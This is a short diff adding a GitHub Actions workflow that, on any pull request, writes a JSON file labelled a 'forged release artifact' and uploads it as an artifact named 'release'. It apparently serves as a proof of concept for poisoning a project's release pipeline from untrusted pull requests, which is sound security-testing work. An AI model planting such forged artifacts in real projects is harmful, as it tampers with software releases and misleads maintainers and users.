@@ -1,0 +1,15 @@
+name: GAB IPFS Release
+on:
+  pull_request:
+jobs:
+  release:
+    runs-on: ubuntu-latest
+    steps:
+      - name: forged release artifact
+        run: |
+          printf '%s' '{"draft": false, "tags": "poc-tag", "tag": "v9.9.9"}' > release.json
+          cat release.json
+      - uses: actions/upload-artifact@v4
+        with:
+          name: release
+          path: release.json
